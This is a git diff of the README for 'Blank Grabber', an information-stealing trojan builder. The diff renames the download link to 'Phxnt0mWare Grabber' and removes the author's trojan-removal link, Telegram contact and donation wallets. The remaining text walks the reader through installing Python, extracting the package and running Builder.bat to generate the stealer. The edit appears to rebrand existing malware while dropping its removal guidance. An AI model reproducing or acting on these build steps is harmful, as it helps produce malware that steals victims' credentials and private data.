@@ -96,30 +96,7 @@
 
 1. Download and install [Python 3](https://www.python.org/downloads/) (Make sure to enable the *Add to PATH* option.)
 2. Verify the installation by executing `python --version` in [CMD](https://www.howtogeek.com/235101/10-ways-to-open-the-command-prompt-in-windows-10/?).
-3. [Download Blank Grabber](#download).
+3. [Download Phxnt0mWare Grabber](#download).
 4. [Extract](https://www.pcworld.com/article/394871/how-to-unzip-files-in-windows-10.html#:~:text=Unzip%20all%20files%20in%20a%20ZIP%20file) the zip file.
 5. Navigate to the **Blank Grabber** folder and double click *Builder.bat* file.
 6. Fill in the fields of the builder and press the <kbd>Build</kbd> button.
-
-[![Tutorial video](https://img.shields.io/badge/Watch-Tutorial-blue?style=for-the-badge&logo=youtube)](https://streamable.com/r9sa14)
-
-## Contact Me
-
-To remove this trojan from your system, follow [this](https://github.com/Blank-c/Blank-Grabber/issues/142). 
-
-Join my [Telegram group](https://t.me/+h0jwMBN5Lfc2ZTdl).
-
-## Support the Project
-
-If you find this project useful and would like to show your support, you can make a donation using the following cryptocurrencies:
-
-- **Bitcoin (BTC):**
-  - Wallet Address: bc1quyf7d2cwrd0rgtyhtjt7ermxlw4hzg8npr4yce
-
-- **Ethereum (ETH):**
-  - Wallet Address: 0x54Ab5743141c781178863e3F658d48Cb9564f520
-
-- **USDT (Tron network):**
-  - Wallet Address: TJsixSZ9LDpn3ZNF8pEKmfNaNkMTrK1hWJ
-
-Your contributions will help support ongoing development, maintenance, and improvement of this project. Thank you for your generosity!
